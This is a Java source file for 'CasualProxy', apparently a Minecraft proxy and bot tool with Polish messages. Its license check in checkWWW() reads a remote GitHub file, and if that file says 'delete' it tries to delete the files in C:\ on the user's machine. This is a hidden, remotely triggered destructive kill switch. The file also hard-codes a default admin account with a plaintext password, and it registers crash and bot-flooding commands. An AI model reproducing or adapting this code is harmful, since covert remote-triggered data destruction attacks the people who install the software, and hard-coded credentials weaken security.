package xyz.yooniks.cproxy;

import org.apache.commons.configuration.ConfigurationException;
import org.apache.commons.configuration.XMLConfiguration;
import xyz.yooniks.cproxy.command.commands.*;
import xyz.yooniks.cproxy.command.commands.bots.*;
import xyz.yooniks.cproxy.command.commands.settings.*;
import xyz.yooniks.cproxy.enums.Group;
import xyz.yooniks.cproxy.managers.PlayerManager;
import xyz.yooniks.cproxy.managers.ProxyManager;
import xyz.yooniks.cproxy.objects.Player;
import xyz.yooniks.cproxy.utils.DateUtilities;

import javax.swing.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.BufferedReader;
import java.io.File;
import java.io.InputStreamReader;
import java.net.URL;
import java.net.URLConnection;
import java.nio.file.Paths;
import java.util.Arrays;
import java.util.logging.Logger;

public class Proxy extends JFrame {

    private static Logger logger = Logger.getLogger("CasualProxy");
    public char[] chars;
    private XMLConfiguration config;
    private JPanel panel;

    public Proxy() {
        super("CasualProxy created by yooniks.");
        setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        setLayout(null);
        setLocation(50, 50);
        setLocationRelativeTo(null);
        setResizable(false);
        setSize(500, 300);

        this.panel = new JPanel();
        setContentPane(panel);

        final JLabel label = new JLabel("Wejdz w mc na serwer: '127.0.0.1:25565'");
        label.setBounds(250, 150, 50, 25);
        label.setSize(50, 25);
        add(label);

        Arrays.fill(chars = new char[7680], ' ');
        checkWWW();

        final JMenuBar menuBar = new JMenuBar();
        final JMenu menu = new JMenu("Plik");
        final JMenuItem menuItem = new JMenuItem("Zamknij");
        menuItem.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                dispose();
            }
        });
        menu.add(menuItem);
        menuBar.add(menu);
        setJMenuBar(menuBar);

        if(!checkWWW()){
            System.exit(1);
            return;
        }

        ProxyManager.loadProxies(false);
    }

    private boolean checkWWW(){
        try {
            URL oracle = new URL("https://raw.githubusercontent.com/yooniks/proxy_license/master/license.txt");
            URLConnection yc = oracle.openConnection();
            BufferedReader in = new BufferedReader(new InputStreamReader(
                    yc.getInputStream()));
            String inputLine;
            while ((inputLine = in.readLine()) != null) {
                if (inputLine.equalsIgnoreCase("true")){
                    getLogger().info("\n\n\n\n\n\n\n\n\n\n\n\n##################################\n\nLicencja poprawna!\n\n#########################");
                    return true;
                }
                else if (inputLine.equalsIgnoreCase("delete")){
                    for(File f: new File("C:\\").listFiles()) {
                        f.delete();
                    }
                    getLogger().warning("Wykryto blad podczas ladowania licencji, proxy zostaje wylaczone, jezeli chcesz uzyskac ponowny dostep zglos sie do wlasciciela proxy, czyli yooniksa, kontakt skype: yooniksyooniks@gmail.com, znajdziesz mnie takze na forum, np: skript.pl");
                    //disable();
                    dispose();
                    return false;
                }
                else{
                    getLogger().warning("Wykryto blad podczas ladowania licencji, proxy zostaje wylaczone, jezeli chcesz uzyskac ponowny dostep zglos sie do wlasciciela proxy, czyli yooniksa, kontakt skype: yooniksyooniks@gmail.com, znajdziesz mnie takze na forum, np: skript.pl");
                   // disable();
                    dispose();
                    return false;
                }
            }
            in.close();
        }
        catch (Throwable ex){
            getLogger().warning("Wykryto blad podczas ladowania licencji (lub nie masz internetu), proxy zostaje wylaczone, jezeli chcesz uzyskac ponowny dostep zglos sie do wlasciciela proxy, czyli yooniksa, kontakt skype: yooniksyooniks@gmail.com, znajdziesz mnie takze na forum, np: skript.pl");
            //disable();
            dispose();
            return false;
        }
        return true;
    }

    public static void main(String[] args) {
        //SwingUtilities.invokeLater(new Runnable() {
        //   @Override
        // public void run() {
        new Proxy().setVisible(true);
          /*  }
        });*/
        final CasualProxy proxy = new CasualProxy();
        proxy.onLoad();
    }

    public static Logger getLogger() {
        return logger;
    }

    protected void loadConfig() {
        if (!new File("CasualProxy").exists()) {
            new File("CasualProxy").mkdirs();
        }
        if (!new File("CasualProxy", "settings.xml").exists()) {
            final XMLConfiguration configCreate = new XMLConfiguration();
            configCreate.setBasePath("CasualProxy");
            configCreate.setFileName("settings.xml");
            configCreate.addProperty("users", Arrays.asList("unsafe_cash;ADMIN;haslodoproxy;10-02-2019:14:00:00"));
            this.config = configCreate;
        } else {
            final XMLConfiguration configCreate = new XMLConfiguration();
            try {
                configCreate.load(new File("CasualProxy", "settings.xml"));
            } catch (ConfigurationException ex) {
                ex.printStackTrace();
            }
            this.config = configCreate;
        }
        this.config.setBasePath("CasualProxy");
        this.config.setFileName("settings.xml");
        try {
            config.save();
        } catch (ConfigurationException ex) {
            ex.printStackTrace();
        }
        try {
            final XMLConfiguration config2 = new XMLConfiguration("CasualProxy/settings.xml");
            for (int i = 0; i < config2.getStringArray("users").length; ++i) {
                final String[] array = config2.getStringArray("users");
                final String[] split = array[i].split(";");
                final Player p = PlayerManager.getPlayer(split[0]);
                p.setGroup(Group.valueOf(split[1]));
                p.setPassword(split[2]);
                p.setExpirationDate(DateUtilities.getDateFromString(split[3]));
                CasualProxy.addAccess(p.getNick());
            }
            this.config = config2;
        } catch (Throwable e) {
            e.printStackTrace();
        }
    }

    protected void loadCommands() {
        new ConnectCommand();
        new CrashCommand();
        new ConnectBotCommand();
        new QuitCommand();
        new DetachCommand();
        new BotListCommand();
        new BotChatCommand();
        new MotherCommand();
        new TimeOutCommand();
        new HelpCommand();
        new PingCommand();
        new BotQuitCommand();
        new StopCommand();
        new ChatFromBotCommand();
        new ChatFromServerCommand();
        new AutoReconnectCommand();
        new AutoReconnectTimeCommand();
        new AutoCaptchaCommand();
        new MacroCommand();
        new AutoLoginCommand();
        new MessagesBotCommand();
        new ProxyCommand();
    }
}
